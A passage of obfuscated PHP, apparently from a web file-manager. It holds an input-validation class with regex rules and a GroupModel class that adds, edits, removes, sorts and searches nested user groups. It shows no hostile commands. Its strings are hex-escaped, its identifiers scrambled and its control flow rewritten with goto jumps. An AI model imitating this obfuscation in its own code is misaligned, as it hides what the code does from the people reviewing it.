$cëİÜ„º­¨[1240], $FëŠßÆ«Û . $cëİÜ„º­¨[874] . $BÖ¯®âĞ); $C‚‡œ´’Ò¨ = $BÖ¯®âĞ; if (isset($DĞ”è¶à†¯[$cëİÜ„º­¨[1872]]) && $DĞ”è¶à†¯[$cëİÜ„º­¨[1872]]) { $C‚‡œ´’Ò¨ = $DĞ”è¶à†¯[$cëİÜ„º­¨[1872]]; } goto AåòÂµÁŒÙ; aå¿šèÇ„µ: } goto bî»–è‹ƒÈ; D–‡î†ÕÇÛ: } public static function reg($DàÎ­¦…‚… = "\162\145\x71\x75\x69\x72\x65") { static $AØï•ô¾÷† = array("\x72\145\x71\165\x69\x72\145" => "\x2e\x2b", "\x6e\165\x6d\142\x65\x72" => "\134\x64\x2b", "\150\145\x78" => "\x5b\60\55\x39\x41\x2d\106\x61\x2d\x66\x5d\53", "\x69\156\x74" => "\x5b\55\134\x2b\135\77\134\144\53", "\x62\157\157\x6c" => "\60\174\x31", "\x66\x6c\x6f\141\164" => "\x5b\55\134\x2b\x5d\x3f\x5c\144\x2b\50\x5c\x2e\134\144\x2b\51\77", "\145\x6e\x67\154\151\163\x68" => "\133\x41\55\x5a\x61\55\x7a\40\x5d\x2b", "\143\x68\x69\x6e\145\x73\145" => "\133\134\170\x7b\64\145\x30\60\x7d\55\134\170\x7b\x39\146\x61\x35\x7d\x5d\53", "\x68\x61\x73\103\x68\x69\x6e\x65\x73\145" => "\x2f\50\133\x5c\170\173\64\x65\x30\60\x7d\x2d\x5c\170\173\x39\x66\x61\x35\175\x5d\53\x29\x2f\165", "\145\x6d\x61\151\154" => "\134\x77\53\50\133\134\56\x5c\55\135\x5c\x77\53\51\52\134\100\134\x77\x2b\x28\x5b\134\56\x5c\55\x5d\134\167\53\51\x2a\x5c\x2e\x5c\167\x2b", "\x70\x68\157\156\x65" => "\x31\x5b\63\55\71\x5d\134\x64\173\71\x7d", "\164\145\x6c\x70\150\x6f\156\145" => "\x28\x5c\x28\134\x64\x7b\63\54\x34\x7d\134\51\174\134\144\173\x33\54\64\175\55\174\134\x73\51\77\x5c\x64\173\67\x2c\61\64\x7d", "\x75\162\154" => "\x28\x68\164\x74\x70\174\146\164\x70\x7c\x68\x74\x74\160\x73\51\72\x5c\57\x5c\57\133\134\x77\x5c\x2d\x5f\135\53\x28\x5c\x2e\133\x5c\167\134\x2d\137\135\x2b\51\53\50\133\134\x77\x5c\x2d\x5c\x2e\x2c\x40\77\x5e\75\x25\x26\x3a\x5c\57\x7e\134\53\43\x5d\52\x5b\134\167\x5c\55\x5c\x40\77\x5e\x3d\45\46\134\57\176\x5c\53\43\x5d\x29\x3f", "\165\162\154\x46\165\x6c\154" => "\x5b\x61\x2d\x7a\x41\x2d\x7a\x5d\53\x3a\x5c\57\134\x2f\x5b\x5e\x5c\163\x5d\52", "\x69\160" => "\50\x5c\144\173\61\54\x33\175\134\56\x29\x7b\63\175\x28\134\144\x7b\61\54\x33\175\51", "\172\151\x70" => "\133\x31\x2d\x39\135\134\144\173\x35\x7d\50\77\x21\134\144\51", "\x69\x64\103\x61\x72\144" => "\50\134\x64\x7b\x31\65\175\51\174\50\x5c\144\x7b\x31\x37\x7d\50\134\144\x7c\x58\x7c\170\51\x29", "\143\157\x6c\157\162" => "\x23\50\133\60\x2d\71\101\x2d\x46\141\55\146\x5d\173\63\175\x7c\x5b\x30\x2d\71\x41\55\x46\x61\x2d\146\x5d\x7b\x36\175\x29", "\x74\x69\x6d\145" => "\x28\133\x30\55\x31\135\134\144\174\x32\x5b\60\x2d\x34\135\51\x3a\133\x30\55\65\135\x5c\x64", "\x64\x61\164\x65" => "\x5c\144\173\x34\175\133\55\134\x2f\x5d\x3f\x28\x30\133\61\55\71\135\174\x31\x5b\x30\x2d\x32\135\51\x5b\55\x5c\x2f\135\x3f\x28\x5b\x30\55\x32\135\x5c\144\174\63\133\60\x2d\61\135\51", "\144\x61\x74\145\124\151\155\145" => "\x5c\144\173\x34\175\133\x2d\134\57\x5d\77\x28\x30\133\x31\x2d\x39\135\x7c\61\133\x30\55\x32\135\51\133\55\x5c\57\x5d\x3f\x28\133\60\55\x32\x5d\x5c\144\174\x33\133\x30\55\x31\135\51\x5c\163\53\x28\x5b\60\x2d\x31\x5d\134\144\174\x32\133\60\x2d\64\135\x29\72\133\60\x2d\65\135\134\x64", "\x70\x61\163\x73\167\157\162\144" => "\x28\x3f\75\56\52\134\x64\51\50\x3f\x3d\x2e\x2a\x5b\141\55\x7a\x5d\x29\x28\77\x3d\x2e\x2a\x5b\101\x2d\132\x5d\x29\56\173\70\x2c\62\60\175", "\x6b\145\171" => "\133\x41\55\x5a\x61\x2d\x7a\x30\x2d\71\x5f\134\55\134\56\135\x2b", "\x6b\145\171\106\165\x6c\154" => "\133\x41\55\x5a\141\x2d\x7a\60\x2d\x39\137\x5c\x2d\134\x2e\134\163\54\x5d\x2b"); if (!$DàÎ­¦…‚…) { return $AØï•ô¾÷†; } return $AØï•ô¾÷†[$DàÎ­¦…‚…]; } public static function check($B³ãĞÒ²•, $eâ¤—°‰, $DÑ¾¯³ŞŞ = null) { $aÂŒˆËºÜ =& $_SERVER[îÖ]; switch ($eâ¤—°‰) { case $aÂŒˆËºÜ[7]: return in_array($B³ãĞÒ²•, $DÑ¾¯³ŞŞ); break; case $aÂŒˆËºÜ[1876]: return floatval($B³ãĞÒ²•) > $DÑ¾¯³ŞŞ; break; case $aÂŒˆËºÜ[1877]: return floatval($B³ãĞÒ²•) < $DÑ¾¯³ŞŞ; break; case $aÂŒˆËºÜ[325]: return strlen($B³ãĞÒ²•) >= $DÑ¾¯³ŞŞ[0] && strlen($B³ãĞÒ²•) <= $DÑ¾¯³ŞŞ[1]; break; case $aÂŒˆËºÜ[325]: if (is_array($DÑ¾¯³ŞŞ)) { return strlen($B³ãĞÒ²•) >= $DÑ¾¯³ŞŞ[0] && strlen($B³ãĞÒ²•) <= $DÑ¾¯³ŞŞ[1]; break; } else { return strlen($B³ãĞÒ²•) == $DÑ¾¯³ŞŞ; break; } case $aÂŒˆËºÜ[321]: return floatval($B³ãĞÒ²•) >= $DÑ¾¯³ŞŞ[0] && floatval($B³ãĞÒ²•) <= $DÑ¾¯³ŞŞ[1]; break; } $e¼½¹½•êº = self::reg(!1); $eâ¤—°‰ = isset($e¼½¹½•êº[$eâ¤—°‰]) ? $e¼½¹½•êº[$eâ¤—°‰] : $eâ¤—°‰; if (substr($eâ¤—°‰, 0, 1) != $aÂŒˆËºÜ[8]) { $eâ¤—°‰ = $aÂŒˆËºÜ[1878] . $eâ¤—°‰ . $aÂŒˆËºÜ[1879]; } return preg_match($eâ¤—°‰, $B³ãĞÒ²•) === 1; } public static function get($bÉìŠæ‹âÎ, $e¼ßø‡èØÔ = null, $b…¢Öİì­« = null, $d…êÄ³İâ† = null) { goto dª˜ù°±àˆ; dª˜ù°±àˆ: $c¯æƒ…ùÉà =& $_SERVER[îÖ]; $c‘¿Ş‚£¸õ = array(); if (!is_null($b…¢Öİì­«)) { $c‘¿Ş‚£¸õ[$c¯æƒ…ùÉà[34]] = $b…¢Öİì­«; } goto D™®ŸËÄ; D™®ŸËÄ: if (!is_null($d…êÄ³İâ†)) { $c‘¿Ş‚£¸õ[$c¯æƒ…ùÉà[1006]] = $d…êÄ³İâ†; } if (!is_null($e¼ßø‡èØÔ)) { $c‘¿Ş‚£¸õ[$c¯æƒ…ùÉà[1874]] = $e¼ßø‡èØÔ; } $a…“Ñ£ŞŒå = Input::getArray(array($bÉìŠæ‹âÎ => $c‘¿Ş‚£¸õ)); goto B¡Ğšõ•ÒÎ; B¡Ğšõ•ÒÎ: return $a…“Ñ£ŞŒå[$bÉìŠæ‹âÎ]; goto a‰ïÃ˜–º·; a‰ïÃ˜–º·: } } $CìÂÜËù´ = LIB_DIR . $_SERVER[îÖ][678]; goto FŠõÍ‰Ş’ê; DÚ¡¶æÕÌ: class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\x75\160"; protected $tableMeta = array("\164\x61\x62\x6c\145\116\141\x6d\x65" => "\147\162\x6f\x75\160\137\155\x65\x74\141", "\155\x65\164\141\x46\151\145\x6c\144" => "\147\162\x6f\x75\160\x49\104"); protected function cacheFunctionAlias($dÆÒ©Œ¹Ç™) { $d—Ø¨§ ö =& $_SERVER[îÖ]; return array($d—Ø¨§ ö[2165] => array($dÆÒ©Œ¹Ç™[0], $d—Ø¨§ ö[2166]), $d—Ø¨§ ö[2167] => array($dÆÒ©Œ¹Ç™[0], $d—Ø¨§ ö[2166])); } protected function getInfo($FÛİçëºÖå) { $a°À—Ş‹› = $this->getInfoSimple($FÛİçëºÖå); if (!$a°À—Ş‹›) { return !1; } return $this->_listDataApplyItem($a°À—Ş‹›); } protected function getInfoSimple($eƒËãÂ¿¿, $D“Î…ÍËÀ = false) { $cóÜ„•Âò =& $_SERVER[îÖ]; if ($D“Î…ÍËÀ) { $f«âƒ„Š¹ = array($cóÜ„•Âò[2099] => intval($eƒËãÂ¿¿)); $A‘ÈŒÎå = $this->where($f«âƒ„Š¹)->find(); return is_array($A‘ÈŒÎå) ? $A‘ÈŒÎå : array(); } return $this->cacheFunctionGet($cóÜ„•Âò[2168], $eƒËãÂ¿¿); } protected function groupAdd($añß¤â¾àó) { goto e’é‘ÓÊŠ; F´š¦Ğõ¢Ì: if (isset($añß¤â¾àó[$Câ­É¨ÎÖ[2171]])) { $this->metaSet($D¿ó¸œ»áÃ, array($Câ­É¨ÎÖ[2171] => $añß¤â¾àó[$Câ­É¨ÎÖ[2171]], $Câ­É¨ÎÖ[2172] => $añß¤â¾àó[$Câ­É¨ÎÖ[2172]])); unset($añß¤â¾àó[$Câ­É¨ÎÖ[2171]]); unset($añß¤â¾àó[$Câ­É¨ÎÖ[2172]]); } Model($Câ­É¨ÎÖ[1111])->groupRootAdd($D¿ó¸œ»áÃ); return $D¿ó¸œ»áÃ; goto fÃ•Õ‚’£; b˜œ¢˜¦‚¼: if ($c¯æŞ¿çíĞ[$Câ­É¨ÎÖ[459]]) { $C¬ù¨ÒÑÅŠ = $c¯æŞ¿çíĞ[$Câ­É¨ÎÖ[459]] . $c¯æŞ¿çíĞ[$Câ­É¨ÎÖ[2099]] . $Câ­É¨ÎÖ[47]; } $bÂçÂäÖË = array($Câ­É¨ÎÖ[386] => $this->groupNameAuto($añß¤â¾àó[$Câ­É¨ÎÖ[461]], $añß¤â¾àó[$Câ­É¨ÎÖ[28]]), $Câ­É¨ÎÖ[368] => $añß¤â¾àó[$Câ­É¨ÎÖ[461]], $Câ­É¨ÎÖ[525] => $C¬ù¨ÒÑÅŠ, $Câ­É¨ÎÖ[2169] => $añß¤â¾àó[$Câ­É¨ÎÖ[2083]], $Câ­É¨ÎÖ[2170] => 0, $Câ­É¨ÎÖ[2103] => 0); if (isset($añß¤â¾àó[$Câ­É¨ÎÖ[2120]])) { $bÂçÂäÖË[$Câ­É¨ÎÖ[2120]] = $añß¤â¾àó[$Câ­É¨ÎÖ[2120]]; } else { $A®­„Ó¸ªâ = $this->max($Câ­É¨ÎÖ[2120]); if (!$A®­„Ó¸ªâ) { $A®­„Ó¸ªâ = 0; } $bÂçÂäÖË[$Câ­É¨ÎÖ[2120]] = $A®­„Ó¸ªâ + 1; } goto dÑ ‘¢‚Àç; dÑ ‘¢‚Àç: if (!empty($añß¤â¾àó[$Câ­É¨ÎÖ[2099]])) { $bÂçÂäÖË[$Câ­É¨ÎÖ[2099]] = $añß¤â¾àó[$Câ­É¨ÎÖ[2099]]; } $D¿ó¸œ»áÃ = $this->add($bÂçÂäÖË); $this->setNamePinyin($D¿ó¸œ»áÃ, $bÂçÂäÖË[$Câ­É¨ÎÖ[28]]); goto F´š¦Ğõ¢Ì; e’é‘ÓÊŠ: $Câ­É¨ÎÖ =& $_SERVER[îÖ]; if (!$añß¤â¾àó[$Câ­É¨ÎÖ[461]] && isset($añß¤â¾àó[$Câ­É¨ÎÖ[2099]]) && $añß¤â¾àó[$Câ­É¨ÎÖ[2099]] == 1) { if ($c¯æŞ¿çíĞ = $this->getInfoSimple($añß¤â¾àó[$Câ­É¨ÎÖ[2099]], !0)) { return $añß¤â¾àó[$Câ­É¨ÎÖ[2099]]; } } else { $c¯æŞ¿çíĞ = $this->getInfoSimple($añß¤â¾àó[$Câ­É¨ÎÖ[461]]); if (!$c¯æŞ¿çíĞ) { return !1; } } $C¬ù¨ÒÑÅŠ = $Câ­É¨ÎÖ[470]; goto b˜œ¢˜¦‚¼; fÃ•Õ‚’£: } protected function groupEdit($dŠ™¦¦ô’¾, $c‰§‚Ş‘íÛ) { $B‚ÂÑ Üë =& $_SERVER[îÖ]; if (!empty($c‰§‚Ş‘íÛ[$B‚ÂÑ Üë[461]])) { $e¨…Ú–Ê³ï = $this->getInfoSimple($dŠ™¦¦ô’¾); $Dªï°ª¸·Å = $this->getInfoSimple($c‰§‚Ş‘íÛ[$B‚ÂÑ Üë[461]]); if (!$e¨…Ú–Ê³ï || !$Dªï°ª¸·Å) { return !1; } if ($e¨…Ú–Ê³ï[$B‚ÂÑ Üë[2099]] == $Dªï°ª¸·Å[$B‚ÂÑ Üë[2099]]) { return !1; } if ($c‰§‚Ş‘íÛ[$B‚ÂÑ Üë[461]] != $e¨…Ú–Ê³ï[$B‚ÂÑ Üë[461]]) { if ($Dªï°ª¸·Å[$B‚ÂÑ Üë[459]] !== $e¨…Ú–Ê³ï[$B‚ÂÑ Üë[459]] && strpos($Dªï°ª¸·Å[$B‚ÂÑ Üë[459]], $e¨…Ú–Ê³ï[$B‚ÂÑ Üë[459]] . $e¨…Ú–Ê³ï[$B‚ÂÑ Üë[2099]] . $B‚ÂÑ Üë[47]) === 0) { return !1; } $c‰§‚Ş‘íÛ[$B‚ÂÑ Üë[525]] = $Dªï°ª¸·Å[$B‚ÂÑ Üë[459]] . $c‰§‚Ş‘íÛ[$B‚ÂÑ Üë[461]] . $B‚ÂÑ Üë[47]; $this->_changeChildLevel($e¨…Ú–Ê³ï, $Dªï°ª¸·Å); } } if (isset($c‰§‚Ş‘íÛ[$B‚ÂÑ Üë[28]])) { $this->setNamePinyin($dŠ™¦¦ô’¾, $c‰§‚Ş‘íÛ[$B‚ÂÑ Üë[28]]); } if (isset($c‰§‚Ş‘íÛ[$B‚ÂÑ Üë[2171]])) { $this->metaSet($dŠ™¦¦ô’¾, array($B‚ÂÑ Üë[2171] => $c‰§‚Ş‘íÛ[$B‚ÂÑ Üë[2171]], $B‚ÂÑ Üë[2172] => $c‰§‚Ş‘íÛ[$B‚ÂÑ Üë[2172]])); unset($c‰§‚Ş‘íÛ[$B‚ÂÑ Üë[2171]]); unset($c‰§‚Ş‘íÛ[$B‚ÂÑ Üë[2172]]); } return $this->where(array($B‚ÂÑ Üë[2173] => $dŠ™¦¦ô’¾))->save($c‰§‚Ş‘íÛ); } private function _changeChildLevel($f’ÏÍ¯¸îï, $f¥ÛÚ„óë‰, $Fó‹‚ÛÌà = false) { goto Eœ¬»È‰ã“; dË’Ø„”: $this->where($aöè£‘½ğõ)->data($BÈöŸõ£)->save(); goto Dƒ©ÇÄìè¦; DìïËô¡í“: if ($Fó‹‚ÛÌà) { $C®ÂÓ–ÑêÖ = $f¥ÛÚ„óë‰[$e–¤ğãÇƒê[459]] . $f¥ÛÚ„óë‰[$e–¤ğãÇƒê[2099]] . $e–¤ğãÇƒê[47]; } $aöè£‘½ğõ = array($e–¤ğãÇƒê[525] => array($e–¤ğãÇƒê[483], $f’ÏÍ¯¸îï[$e–¤ğãÇƒê[459]] . $f’ÏÍ¯¸îï[$e–¤ğãÇƒê[2099]] . $e–¤ğãÇƒê[484])); $BÈöŸõ£ = array($e–¤ğãÇƒê[525] => array($e–¤ğãÇƒê[534], "\162\x65\x70\154\141\x63\145\x28\160\x61\x72\145\156\x74\x4c\145\166\x65\x6c\54\x27{$FâÌ‚ÛŠ}\x27\54\47{$C®ÂÓ–ÑêÖ}\x27\x29")); goto dË’Ø„”; Eœ¬»È‰ã“: $e–¤ğãÇƒê =& $_SERVER[îÖ]; $FâÌ‚ÛŠ = $f’ÏÍ¯¸îï[$e–¤ğãÇƒê[459]] . $f’ÏÍ¯¸îï[$e–¤ğãÇƒê[2099]] . $e–¤ğãÇƒê[47]; $C®ÂÓ–ÑêÖ = $f¥ÛÚ„óë‰[$e–¤ğãÇƒê[459]] . $f¥ÛÚ„óë‰[$e–¤ğãÇƒê[2099]] . $e–¤ğãÇƒê[47] . $f’ÏÍ¯¸îï[$e–¤ğãÇƒê[2099]] . $e–¤ğãÇƒê[47]; goto DìïËô¡í“; Dƒ©ÇÄìè¦: } public function setNamePinyin($D¹É¶†—, $b—›Ì›£ôä = false) { $cÜëÆ¸îÅ =& $_SERVER[îÖ]; if (!$b—›Ì›£ôä) { $AòÙ¿ãá = $this->getInfoSimple($D¹É¶†—); $b—›Ì›£ôä = $AòÙ¿ãá[$cÜëÆ¸îÅ[28]]; } if (!Input::check($b—›Ì›£ôä, $cÜëÆ¸îÅ[528])) { $this->metaSet($D¹É¶†—, $cÜëÆ¸îÅ[416], null); $this->metaSet($D¹É¶†—, $cÜëÆ¸îÅ[415], null); return; } $fÆ‰ÅñÆè = array($cÜëÆ¸îÅ[416] => str_replace($cÜëÆ¸îÅ[50], $cÜëÆ¸îÅ[33], Pinyin::encode($b—›Ì›£ôä)), $cÜëÆ¸îÅ[415] => Pinyin::encode($b—›Ì›£ôä, $cÜëÆ¸îÅ[529])); $this->metaSet($D¹É¶†—, $fÆ‰ÅñÆè); } protected function groupStatus($B„éïŞï‘İ, $A»»ĞÌàá) { goto Fµ…åâàé–; Fµ…åâàé–: $B‰®ğš»œÓ =& $_SERVER[îÖ]; $c‚‰„†à”ç = $this->getInfoSimple($B„éïŞï‘İ); if (!$c‚‰„†à”ç) { return !1; } goto aÅ‹†ñ¯×; aÅ‹†ñ¯×: if ($A»»ĞÌàá == $B‰®ğš»œÓ[83]) { $F¡°¬®°… = $this->parentLevelArray($c‚‰„†à”ç[$B‰®ğš»œÓ[459]]); } else { $F¸¶±‹›† = array($B‰®ğš»œÓ[525] => array($B‰®ğš»œÓ[483], $c‚‰„†à”ç[$B‰®ğš»œÓ[459]] . $c‚‰„†à”ç[$B‰®ğš»œÓ[2099]] . $B‰®ğš»œÓ[484])); $F¡°¬®°… = $this->where($F¸¶±‹›†)->field($B‰®ğš»œÓ[2099])->select(); $F¡°¬®°… = array_to_keyvalue($F¡°¬®°…, $B‰®ğš»œÓ[33], $B‰®ğš»œÓ[2099]); } $F¡°¬®°…[] = $c‚‰„†à”ç[$B‰®ğš»œÓ[2099]]; $bã¶·æ½´¤ = array(); goto dİéŞÔ„«§; dİéŞÔ„«§: foreach ($F¡°¬®°… as $B„éïŞï‘İ) { $bã¶·æ½´¤[] = array($B‰®ğš»œÓ[2099] => $B„éïŞï‘İ, $B‰®ğš»œÓ[89] => $B‰®ğš»œÓ[688], $B‰®ğš»œÓ[359] => $A»»ĞÌàá); } return Model($B‰®ğš»œÓ[2174])->addAll($bã¶·æ½´¤, array(), !0); goto DĞ—ÑïÂ‚; DĞ—ÑïÂ‚: } private function _groupStatusApply($C²¶êğ¾äì, $Aèœ¹”í¿ñ) { $eÎåï±à« =& $_SERVER[îÖ]; if ($Aèœ¹”í¿ñ == $eÎåï±à«[83]) { $f¥šª•‚Îß = $this->parentLevelArray($C²¶êğ¾äì[$eÎåï±à«[459]]); } else { $dÖ¬’‘‹½ä = array($eÎåï±à«[525] => array($eÎåï±à«[483], $C²¶êğ¾äì[$eÎåï±à«[459]] . $C²¶êğ¾äì[$eÎåï±à«[2099]] . $eÎåï±à«[484])); $f¥šª•‚Îß = $this->where($dÖ¬’‘‹½ä)->field($eÎåï±à«[2099])->select(); $f¥šª•‚Îß = array_to_keyvalue($f¥šª•‚Îß, $eÎåï±à«[33], $eÎåï±à«[2099]); } if (empty($f¥šª•‚Îß)) { return; } $B¿¦Ò¤„ø = array(); foreach ($f¥šª•‚Îß as $Cæ“ÅçÎÂç) { $B¿¦Ò¤„ø[] = array($eÎåï±à«[2099] => $Cæ“ÅçÎÂç, $eÎåï±à«[89] => $eÎåï±à«[688], $eÎåï±à«[359] => $Aèœ¹”í¿ñ); } Model($eÎåï±à«[2174])->addAll($B¿¦Ò¤„ø, array(), !0); } protected function groupRemove($Aç‚£Ì¢µ) { goto aÓ¡Ó‹ˆ‰ù; DÙÛÒØ’: $this->where(array($A°ïË°Ï¨[461] => $Aç‚£Ì¢µ))->save(array($A°ïË°Ï¨[461] => $B¶ËÛÓÑµ[$A°ïË°Ï¨[461]])); Model($A°ïË°Ï¨[2174])->where($e¹°ï°½“ƒ)->delete(); Model($A°ïË°Ï¨[2175])->where($e¹°ï°½“ƒ)->delete(); goto Eäâ®™­Ì‚; D¶ŠÜÃŒóÑ: if (!$B¶ËÛÓÑµ || $B¶ËÛÓÑµ[$A°ïË°Ï¨[461]] == 0) { return !1; } $C¬Ä»­Ñ…Ë = $this->getInfoSimple($B¶ËÛÓÑµ[$A°ïË°Ï¨[461]]); $this->_changeChildLevel($B¶ËÛÓÑµ, $C¬Ä»­Ñ…Ë, !0); goto DÙÛÒØ’; Eäâ®™­Ì‚: Model($A°ïË°Ï¨[752])->groupRootRemove($Aç‚£Ì¢µ); return $this->where($e¹°ï°½“ƒ)->delete(); goto CâÙù•ŠØŠ; aÓ¡Ó‹ˆ‰ù: $A°ïË°Ï¨ =& $_SERVER[îÖ]; $e¹°ï°½“ƒ = array($A°ïË°Ï¨[2099] => $Aç‚£Ì¢µ); $B¶ËÛÓÑµ = $this->where($e¹°ï°½“ƒ)->find(); goto D¶ŠÜÃŒóÑ; CâÙù•ŠØŠ: } protected function groupSort($aÆƒÕµ Úø) { $cøñÓÉ›¹¶ =& $_SERVER[îÖ]; $Eóãó’ñƒ = array(); foreach ($aÆƒÕµ Úø as $b»‡ƒÔƒÜ¸ => $e‘ˆßÔ’‡Ã) { $Eóãó’ñƒ[] = array($cøñÓÉ›¹¶[2099], $e‘ˆßÔ’‡Ã, $cøñÓÉ›¹¶[2120], $b»‡ƒÔƒÜ¸ + 1); } $this->saveAll($Eóãó’ñƒ); } public function listData() { $Bœ²˜’ƒáø = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Bœ²˜’ƒáø[$_SERVER[îÖ][354]]); return $Bœ²˜’ƒáø; } private function _makeOrder($F­ª“İ›‡† = '') { goto B–ò×Çø†; B–ò×Çø†: $EŠİè“¦æÌ =& $_SERVER[îÖ]; $cê‰ÙÂÔğè = array($EŠİè“¦æÌ[2099], $EŠİè“¦æÌ[28], $EŠİè“¦æÌ[2085], $EŠİè“¦æÌ[187]); $b¾àÕ˜ÁÑù = array($EŠİè“¦æÌ[402] => $EŠİè“¦æÌ[403], $EŠİè“¦æÌ[404] => $EŠİè“¦æÌ[405]); goto Aàö’¿ãÎ; fïì…ÇÙ¦ã: $F­ª“İ›‡† = $F­ª“İ›‡† . "{$Eµ¾’¬×À°}\x20{$AÙ·š›èÔ’}\54\x20\147\162\157\165\160\111\104\x20\x61\163\143"; return $this->order($F­ª“İ›‡†); goto Aµ«óÜêÜß; Aàö’¿ãÎ: $Eµ¾’¬×À° = Input::get($EŠİè“¦æÌ[407], $EŠİè“¦æÌ[7], $EŠİè“¦æÌ[2103], $cê‰ÙÂÔğè); $AÙ·š›èÔ’ = Input::get($EŠİè“¦æÌ[408], $EŠİè“¦æÌ[7], $EŠİè“¦æÌ[2176], array($EŠİè“¦æÌ[2176], $EŠİè“¦æÌ[404])); $AÙ·š›èÔ’ = $b¾àÕ˜ÁÑù[$AÙ·š›èÔ’]; goto fïì…ÇÙ¦ã; Aµ«óÜêÜß: } public function listChild($D—Ô‹‰Ğğ¿) { $eÓ˜Š¦¯Â =& $_SERVER[îÖ]; $F‚ß¸¡­ÇŞ = $this->where(array($eÓ˜Š¦¯Â[461] => $D—Ô‹‰Ğğ¿))->_makeOrder()->selectPage(200); $this->_listDataApply($F‚ß¸¡­ÇŞ[$eÓ˜Š¦¯Â[354]]); return $F‚ß¸¡­ÇŞ; } public function listByID($bÊ‡ÙÂ·°ö) { $FßÉÒÈÁÕ =& $_SERVER[îÖ]; if (!$bÊ‡ÙÂ·°ö) { return array(); } $b¼à¾Òµ = array($FßÉÒÈÁÕ[2099] => array($FßÉÒÈÁÕ[7], $bÊ‡ÙÂ·°ö)); $cËçøÄ²¶‰ = $this->where($b¼à¾Òµ)->select(); $this->_listDataApply($cËçøÄ²¶‰); return $cËçøÄ²¶‰; } public function listSearch($b¸Ò«ùëíã) { goto d’ğµØ¬¢ˆ; E½‡ÒøØÄ±: if (!$Fèºö¸çĞ¶ || count($Fèºö¸çĞ¶[$C¤¯…”Ìö[354]]) < 5 && Input::check($f®Ãôø—•ë, $C¤¯…”Ìö[306])) { goto b“äÅĞÚ¬; b“äÅĞÚ¬: $aÀºòÈˆêë = $this->groupChildrenAll($fØÔİÅÎÈ); $d‚ë÷ç‹¿ä = $this->_searchFromMeta($C¤¯…”Ìö[415], $f®Ãôø—•ë, 10, $aÀºòÈˆêë); $DñÔËÙ´¡ = $this->_searchFromMeta($C¤¯…”Ìö[416], $f®Ãôø—•ë, 10, $aÀºòÈˆêë); goto f„‹Ìç©…; f„‹Ìç©…: $fÅÉ¶Ë¯î† = array_merge($d‚ë÷ç‹¿ä, $DñÔËÙ´¡, $Fèºö¸çĞ¶[$C¤¯…”Ìö[354]]); $Fèºö¸çĞ¶[$C¤¯…”Ìö[354]] = array_unique_by_key($fÅÉ¶Ë¯î†, $C¤¯…”Ìö[2099]); $Fèºö¸çĞ¶[$C¤¯…”Ìö[351]][$C¤¯…”Ìö[352]] = count($Fèºö¸çĞ¶[$C¤¯…”Ìö[354]]); goto F£¨ØÌóŠô; F£¨ØÌóŠô: $Fèºö¸çĞ¶[$C¤¯…”Ìö[351]][$C¤¯…”Ìö[353]] = ceil($Fèºö¸çĞ¶[$C¤¯…”Ìö[351]][$C¤¯…”Ìö[352]] / $Fèºö¸çĞ¶[$C¤¯…”Ìö[351]][$C¤¯…”Ìö[349]]); goto f¥›²ªÎŸé; f¥›²ªÎŸé: } $this->_listDataApply($Fèºö¸çĞ¶[$C¤¯…”Ìö[354]]); return $Fèºö¸çĞ¶; goto c‚æ‹ìå²×; d’ğµØ¬¢ˆ: $C¤¯…”Ìö =& $_SERVER[îÖ]; $f®Ãôø—•ë = $b¸Ò«ùëíã[$C¤¯…”Ìö[2177]]; $fØÔİÅÎÈ = isset($b¸Ò«ùëíã[$C¤¯…”Ìö[2178]]) ? $b¸Ò«ùëíã[$C¤¯…”Ìö[2178]] : !1; goto EÄª‹ÒæŠ¦; EÄª‹ÒæŠ¦: if (!trim($f®Ãôø—•ë)) { return !1; } $f®Ãôø—•ë = str_replace($C¤¯…”Ìö[2179], $C¤¯…”Ìö[2180], $f®Ãôø—•ë); $Fø¹·ÏÏÜŒ = array($C¤¯…”Ìö[2099] => array($C¤¯…”Ìö[751], "\45{$f®Ãôø—•ë}\x25"), $C¤¯…”Ìö[28] => array($C¤¯…”Ìö[751], "\45{$f®Ãôø—•ë}\45"), $C¤¯…”Ìö[908] => $C¤¯…”Ìö[2181]); goto bæ‘î¾ƒ´; bæ‘î¾ƒ´: if ($fØÔİÅÎÈ) { $CïŞŸÊÉ½Å = $this->getInfoSimple($fØÔİÅÎÈ); $c¬†¾›¯åµ = $CïŞŸÊÉ½Å[$C¤¯…”Ìö[459]] . $fØÔİÅÎÈ . $C¤¯…”Ìö[484]; $Fø¹·ÏÏÜŒ = array($Fø¹·ÏÏÜŒ, array($C¤¯…”Ìö[459] => array($C¤¯…”Ìö[751], $c¬†¾›¯åµ))); } $Fèºö¸çĞ¶ = $this->_makeOrder()->where($Fø¹·ÏÏÜŒ)->selectPage(20); $Fèºö¸çĞ¶ = $Fèºö¸çĞ¶ ? $Fèºö¸çĞ¶ : array(); goto E½‡ÒøØÄ±; c‚æ‹ìå²×: } protected function groupChildrenAll($d÷Ä®Î±ë) { $f£º­¨òÆ =& $_SERVER[îÖ]; if (!$d÷Ä®Î±ë) { return !1; } if (is_string($d÷Ä®Î±ë)) { $d÷Ä®Î±ë = array($d÷Ä®Î±ë); } $Fá›ŠŸ®  = $d÷Ä®Î±ë; foreach ($d÷Ä®Î±ë as $fí×Î‚µŒä) { $B¹ôªğ¼Ï– = $this->getInfoSimple($fí×Î‚µŒä); $a®‰ó³ã¥ = array($f£º­¨òÆ[459] => array($f£º­¨òÆ[751], $B¹ôªğ¼Ï–[$f£º­¨òÆ[459]] . $fí×Î‚µŒä . $f£º­¨òÆ[484])); $d¾Æ½†Ô°Ó = $this->field($f£º­¨òÆ[2099])->where($a®‰ó³ã¥)->select(); $Fá›ŠŸ®  = array_merge($Fá›ŠŸ® , array_to_keyvalue($d¾Æ½†Ô°Ó, $f£º­¨òÆ[33], $f£º­¨òÆ[2099])); } return array_unique($Fá›ŠŸ® ); } private function _searchFromMeta($b¥íˆ¨¦¶ˆ, $B–„®ñ‡¼, $EªëÒÀë¤Ú, $e£¶•ŒÌ¨Ğ) { goto B–¾Ú¤Ñ£Š; d«Ó½êÎº‡: if ($e£¶•ŒÌ¨Ğ) { $CÇ ­Ïô®°[$AÅí‰ÒÌË[2099]] = array($AÅí‰ÒÌË[7], $e£¶•ŒÌ¨Ğ); } $A‹ïå¨‰¶¼ = Model($AÅí‰ÒÌË[2182])->where($CÇ ­Ïô®°)->limit($EªëÒÀë¤Ú)->select(); if (!$A‹ïå¨‰¶¼) { return array(); } goto b•ŒøéÍË´; B–¾Ú¤Ñ£Š: $AÅí‰ÒÌË =& $_SERVER[îÖ]; $B–„®ñ‡¼ = strtolower($B–„®ñ‡¼); $CÇ ­Ïô®° = 